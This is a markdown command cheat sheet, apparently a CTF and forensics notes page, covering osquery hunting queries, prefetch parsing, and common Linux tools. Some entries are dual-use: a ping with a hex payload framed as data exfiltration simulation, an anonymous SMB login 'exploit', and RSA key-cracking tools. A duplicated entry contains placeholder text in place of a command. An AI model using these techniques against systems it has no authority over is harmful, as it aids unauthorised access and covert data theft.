SELECT pid, name, path FROM processes WHERE path LIKE '/tmp/%' OR path LIKE '/var/tmp/%';
```

**_Hunting for Fileless Malware / Process_**

```console
SELECT pid, name, path, cmdline, start_time FROM processes WHERE on_disk = 0;
```

**_Orphan Processes_**

```console
SELECT pid, name, parent, path FROM processes WHERE parent NOT IN (SELECT pid from processes);
```

**_Finding Processes Launched from User Directories_**

```console
SELECT pid, name, path, cmdline, start_time FROM processes WHERE path LIKE '/home/%' OR path LIKE '/Users/%';
```

**_Network Connections_**

```console
SELECT pid, family, remote_address, remote_port, local_address, local_port, state FROM process_open_sockets LIMIT 20;
```

**_Examining DNS Queries_**

```console
SELECT * FROM dns_resolvers;
```

**_Listing Down Network Interfaces_**

```console
Listing Down Network Interfaces
```

**_Listing Down Network Interfaces_**

```console
Listing Down Network Interfaces
```

**_Open Files_**

```console
SELECT pid, fd, path FROM process_open_files;
```

**_Files Being Accessed From the tmp Directory_**

```console
SELECT pid, fd, path FROM process_open_files where path LIKE '/tmp/%';
```

**_Hidden Files_**

```console
SELECT filename, path, directory, size, type FROM file WHERE path LIKE '/.%';
```

**_Recently Modified Files_**

```console
SELECT filename, path, directory, type, size FROM file WHERE path LIKE '/etc/%' AND (mtime > (strftime('%s', 'now') - 86400));
```

**_Recently Modified Binaries_**

```console
SELECT filename, path, directory, mtime FROM file WHERE path LIKE '/opt/%' OR path LIKE '/bin/' AND (mtime > (strftime('%s', 'now') - 86400));
```

**_Run osquery in daemon mode (for scheduled queries)._**

```console
sudo osqueryd
```

More info [here](https://osquery.io/).

## PECmd

PECmd (part of Eric Zimmerman's tools) parses Windows Prefetch files, which record program execution details such as run count, last run times, and loaded files/DLLs — useful for establishing program execution history on a host.

**_Parse all prefetch files in a directory and export the results to a CSV._**

```powershell
.\PECmd.exe -d "C:\Windows\Prefetch" --csv "C:\Users\Administrator\Desktop\Forensics Tools" --csvf prefetch-parsed.csv
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-d` | `<directory>` | Directory containing prefetch files to parse |
| `-f` | `<file>` | Parse a single prefetch file |
| `--csv` | `<directory>` | Output directory for the CSV file |
| `--csvf` | `<filename>` | Output CSV file name |

</details>
<br>

More info [here](https://ericzimmerman.github.io).

## Ping

ping tests connectivity to other network devices by sending ICMP echo request packets. Useful for checking whether a host is reachable and measuring latency.

**_Ping a host._**

```console
ping <ip-or-hostname>
ping 8.8.8.8
```

**_Limit to N packets._**

```console
ping -c <count> <ip>
ping -c 4 8.8.8.8
```

**_Send a ping with a custom payload (hex)._**

```console
ping <ip> -c 1 -p <hex-payload>
ping 10.10.10.10 -c 1 -p 74686d3a7472796861636b6d650a
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-c` | `<count>` | Stop after sending N packets |
| `-i` | `<seconds>` | Interval between packets |
| `-s` | `<bytes>` | Packet size in bytes |
| `-t` | `<ttl>` | Set IP time-to-live |
| `-p` | `<hex>` | Fill packet with a hex pattern (data exfiltration simulation) |
| `-f` | - | Flood ping (requires root) |

</details>
<br>

## Ps

ps reports a snapshot of currently running processes.

**_List all running processes with detailed info (user, CPU, memory, command)._**

```console
ps aux
```

**_Full-format listing of all processes._**

```console
ps -ef
```

**_Show processes for a specific user._**

```console
ps -u <username>
```

**_Show processes sorted by CPU usage._**

```console
ps aux --sort=-%cpu
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `a` | - | Show processes for all users |
| `u` | - | User-oriented format (shows user, CPU %, memory %) |
| `x` | - | Include processes not attached to a terminal |
| `-e` | - | Show all processes (equivalent to `a`) |
| `-f` | - | Full-format listing |
| `-u` | `<user>` | Filter by user |
| `--sort` | `-%cpu` | Sort output (prefix `-` for descending) |

</details>
<br>

## Pspy64

pspy is an unprivileged Linux process snooping tool. It monitors process executions and filesystem events without requiring root privileges — making it ideal for detecting cron jobs, scripts run by other users, and other scheduled executions that would otherwise be invisible.

**_Run pspy64 to monitor process executions._**

```console
./pspy64
```

**_Run with a custom scan interval (milliseconds)._**

```console
./pspy64 -i 500
```

**_Also watch filesystem events in addition to processes._**

```console
./pspy64 -f
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-i` | `<ms>` | Interval in milliseconds between scans (default: 100) |
| `-f` | - | Also watch filesystem events |
| `-r` | `<dirs>` | Directories to watch recursively |
| `-d` | `<dirs>` | Directories to watch non-recursively |
| `-p` | - | Print all commands, not just new/changed ones |

</details>
<br>

More info [here](https://github.com/DominicBreuker/pspy).

## Pstree

pstree displays running processes as a tree, showing parent-child relationships. Useful for identifying abnormal process spawning patterns.

**_Display all processes as a tree._**

```console
pstree
```

**_Show tree with PIDs, user transitions, and full command arguments._**

```console
pstree -aups
```

**_Show tree for a specific user._**

```console
pstree <username>
```

**_Show the parent chain for a specific PID._**

```console
pstree -s <PID>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-a` | - | Show command-line arguments |
| `-u` | - | Show user transitions in parentheses |
| `-p` | - | Show PIDs |
| `-s` | `<PID>` | Show parent processes of a specified process |
| `-n` | - | Sort by PID rather than by name |
| `-h` | - | Highlight the current process and its ancestors |

</details>
<br>

## Route

route displays or modifies the IP routing table. It shows how packets are directed through the network.

**_Display the routing table._**

```console
route
```

**_Display in numeric format (no DNS resolution)._**

```console
route -n
```

**_Add a route._**

```console
sudo route add -net <network> gw <gateway>
```

**_Delete a route._**

```console
sudo route del -net <network>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-n` | - | Show numeric addresses (no hostname resolution) |
| `add` | - | Add a new route |
| `del` | - | Delete a route |
| `-net` | `<network>` | Specify a network address |
| `gw` | `<gateway>` | Specify a gateway |

</details>
<br>

> **Note:** `ip r` is the modern equivalent and preferred on current Linux distributions.

## RsaCTFtool

RSA attack tool (mainly for ctf) - retrieve private key from weak public key and/or uncipher data 

This tool is an utility designed to decrypt data from weak public keys and attempt to recover the corresponding private key. Also this tool offers a comprehensive range of attack options, enabling users to apply various strategies to crack the encryption.

More info and commands can be found [here](https://github.com/RsaCtfTool/RsaCtfTool).

## Rsatool

Rsatool can be used to calculate RSA and RSA-CRT parameters. 

Can be installed from here: 🔗 https://github.com/ius/rsatool

**_Create the PEM and output it to key.pem by supplying modulus and private exponent._**

```console
python rsatool.py -f PEM -o key.pem -n 13826123222358393307 -d 9793706120266356337
```

**_Create the DER and output it to key.der by supplying two primes._**

```console
python rsatool.py -f DER -o key.der -p 4184799299 -q 3303891593
```

## Scalpel

scalpel is a fast file carving tool that recovers files from a disk image based on file headers and footers defined in a configuration file. It is a fork of the original foremost project, focused on speed and low memory usage.

**_Carve files out of a disk image using a configuration file to define which types to recover._**

```console
scalpel Challenge3_deleted_disk.img -o ScalpelOutput -c /etc/scalpel/scalpel.conf
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-o` | `<directory>` | Output directory for recovered files |
| `-c` | `<config>` | Path to the scalpel configuration file defining which file types to carve |

</details>
<br>

More info [here](https://github.com/sleuthkit/scalpel).

## Smbclient

Smbclient is a client that can 'talk' to an SMB/CIFS server and is part of the Samba suite.

**_'Exploit' misconfiguration of the anonymous login ability._**

```console
smbclient <ip> -U:Anonymous -p:<port>
```

## Ss

ss (socket statistics) is the modern replacement for `netstat`. It dumps socket statistics and shows active connections and listening ports, with faster and more detailed output.

**_Show all listening TCP and UDP sockets with process info._**

```console
ss -tlun
```

**_Show all active connections._**

```console
ss -a
```

**_Show TCP connections with process names._**

```console
sudo ss -tlunp
```

**_Show connections to a specific port._**

```console
ss -tn dst :<port>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-t` | - | Show TCP sockets |
| `-u` | - | Show UDP sockets |
| `-l` | - | Show only listening sockets |
| `-n` | - | Show numeric addresses (no DNS resolution) |
| `-p` | - | Show process name and PID |
| `-a` | - | Show all sockets |
| `-s` | - | Show socket statistics summary |

</details>
<br>

## Systemctl

systemctl is the primary tool for managing and inspecting systemd services and units. Used in forensics to enumerate services, identify backdoors, and inspect service configurations.

**_List all services including inactive and failed ones._**

```console
sudo systemctl list-units --all --type=service
```

**_List only currently running services._**

```console
systemctl list-units --type=service --state=running
```

**_View the status and recent logs of a service._**

```console
systemctl status <service-name>
```

**_Print the full unit file for a service._**

```console
systemctl cat <service-name>
```

**_Start, stop, or restart a service._**

```console
sudo systemctl start <service-name>
sudo systemctl stop <service-name>
sudo systemctl restart <service-name>
```

**_Enable or disable a service at boot._**

```console
sudo systemctl enable <service-name>
sudo systemctl disable <service-name>
```

<details markdown>
<summary>Arguments / subcommands</summary>

| Subcommand / Argument | Value | Description |
|----------|-------|-------------|
| `list-units` | `--all --type=service` | List all services including inactive/failed |
| `status` | `<service>` | Show status and recent logs for a service |
| `cat` | `<service>` | Print the full unit file for a service |
| `start` / `stop` | `<service>` | Start or stop a service |
| `enable` / `disable` | `<service>` | Enable or disable a service at boot |
| `--all` | - | Include inactive and failed units in output |
| `--type` | `service` | Filter units by type |

</details>
<br>

More info [here](https://www.man7.org/linux/man-pages/man1/systemctl.1.html).

## Tcpdump

tcpdump captures and analyzes network packets in real time. Packets can be saved to a file for later analysis or filtered to focus on specific traffic types.

**_Capture packets on an interface._**

```console
sudo tcpdump -i <interface>
sudo tcpdump -i eth0
```

**_Capture and save to a file._**

```console
sudo tcpdump -i eth0 -w capture.pcap
```

**_Read a capture file._**

```console
tcpdump -r capture.pcap
```

**_Filter by host._**

```console
sudo tcpdump -i eth0 host <ip>
```

**_Filter by port._**

```console
sudo tcpdump -i eth0 port 80
```

**_Capture N packets then stop._**

```console
sudo tcpdump -i eth0 -c <count>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-i` | `<interface>` | Network interface to capture on |
| `-w` | `<file.pcap>` | Write packets to a file |
| `-r` | `<file.pcap>` | Read packets from a file |
| `-c` | `<count>` | Capture N packets then stop |
| `-n` | - | No DNS resolution |
| `-v` | - | Verbose output |
| `host` | `<ip>` | Filter by host IP |
| `port` | `<number>` | Filter by port number |
| `tcp/udp/icmp` | - | Filter by protocol |

</details>
<br>

## Top

top provides a dynamic real-time view of running processes, showing system resource usage including CPU, memory, and process information.

**_Launch top interactively._**

```console
top
```

**_Filter to a specific user._**

```console
top -u <username>
```

**_Run in batch mode (non-interactive, useful for scripting or logging)._**

```console
top -b -n 1
```

**_Update every N seconds._**

```console
top -d <seconds>
top -d 5
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-b` | - | Batch mode — non-interactive, suitable for output piping |
| `-n` | `<number>` | Exit after this many refresh iterations |
| `-u` | `<user>` | Filter processes by user |
| `-d` | `<seconds>` | Delay interval between updates |
| `-p` | `<PID>` | Monitor only the specified PID(s) |

</details>
<br>

Interactive keys while running: `k` to kill a process, `q` to quit, `M` to sort by memory, `P` to sort by CPU, `u` to filter by user.

## Traceroute

traceroute traces the path packets take to reach a destination, identifying each hop along the way. Useful for diagnosing where network delays or connectivity issues occur.

**_Trace the route to a host._**

```console
traceroute <ip-or-hostname>
traceroute tryhackme.com
```

**_Use ICMP instead of UDP._**

```console
sudo traceroute -I <host>
```

**_Limit the maximum number of hops._**

```console
traceroute -m <max-hops> <host>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-m` | `<hops>` | Maximum number of hops (default: 30) |
| `-n` | - | Do not resolve hostnames |
| `-I` | - | Use ICMP echo requests (requires root) |
| `-T` | - | Use TCP SYN packets |
| `-w` | `<seconds>` | Timeout per probe |

</details>
<br>

> **Note:** On Windows, the equivalent command is `tracert`.

## Uptime

uptime provides a quick snapshot of the system's current status — how long it has been running, the number of logged-in users, and CPU load averages.

**_Display system uptime and load._**

```console
uptime
```

**_Display in a more readable format._**

```console
uptime -p
```

**_Show the time the system was last booted._**

```console
uptime -s
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-p` | - | Show uptime in a human-readable format (e.g. "up 2 hours, 30 minutes") |
| `-s` | - | Show the date and time the system was last started |

</details>
<br>

## Wget

wget is a non-interactive network downloader. Primarily used to download files from the web and useful for testing download speeds and connectivity.

**_Download a file._**

```console
wget <url>
wget https://example.com/file.txt
```

**_Save to a specific filename._**

```console
wget -O <filename> <url>
```

**_Download in the background._**

```console
wget -b <url>
```

**_Continue an interrupted download._**

```console
wget -c <url>
```

**_Mirror a website._**

```console
wget -m <url>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-O` | `<file>` | Save output to a specific filename |
| `-b` | - | Run in background |
| `-c` | - | Continue/resume an interrupted download |
| `-q` | - | Quiet mode (no output) |
| `-r` | - | Recursive download |
| `--no-check-certificate` | - | Skip SSL certificate verification |

</details>
<br>

## Whois

whois queries the WHOIS database for domain registration information. Useful for gathering information about domain owners, registrars, and registration dates.

**_Query WHOIS information for a domain._**

```console
whois <domain>
whois tryhackme.com
```

**_Query WHOIS for an IP address._**

```console
whois <ip>
```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `-h` | `<server>` | Use a specific WHOIS server |
| `-p` | `<port>` | Connect to a specific port |

</details>
<br>

<!--- 

💲 ❕ ➡️

## TITLE

### Usefull documentation

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

### Related tools

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

<br>

--->


<!---

## TITLE



**_Command_**

```console

```

<details markdown>
<summary>Arguments</summary>

| Argument | Value | Description |
|----------|-------|-------------|
| `` | `` | `` |
| `` | `` | `` |
| `` | `` | `` |
| `` | `` | `` |
| `` | `` | `` |

</details>
<br>

More info [here](tools_and_resources.md).

--->